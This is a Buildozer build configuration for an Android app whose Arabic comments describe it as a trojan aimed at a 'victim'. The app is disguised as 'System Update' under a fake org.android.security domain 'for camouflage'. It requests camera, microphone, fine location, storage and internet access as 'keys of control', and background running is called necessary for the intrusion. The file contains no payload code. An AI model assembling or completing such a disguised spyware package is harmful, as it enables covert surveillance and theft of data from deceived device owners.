[app]
# (str) اسم التطبيق الذي سيظهر للضحية
title = System Update

# (str) اسم الحزمة الداخلي (يجب أن يكون فريداً)
package.name = sysupdate

# (str) نطاق الحزمة (للتمويه)
package.domain = org.android.security

# (str) ملف البداية (العقل الذي برمجناه)
source.include_exts = py,png,jpg,kv,atlas

# (list) الأذونات المطلوبة (مفاتيح السيطرة)
android.permissions = INTERNET, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, CAMERA, RECORD_AUDIO, ACCESS_FINE_LOCATION

# (int) نسخة الأندرويد المستهدفة
android.api = 31

# (str) اتجاه الشاشة
orientation = portrait

# (bool) هل يعمل التطبيق في الخلفية (ضروري جداً للاختراق)
android.meta_data = {"android.permission.FOREGROUND_SERVICE": ""}

# (list) المتطلبات البرمجية لعمل النواة
requirements = python3,kivy,requests

# (str) أيقونة التطبيق (يمكنك تركها افتراضية حالياً)
# icon.filename = %(source.dir)s/data/icon.png

[buildozer]
# (int) مستوى التنبيهات أثناء البناء
log_level = 2

# (str) مسار البناء في السيرفر السحابي
bin_dir = ./bin
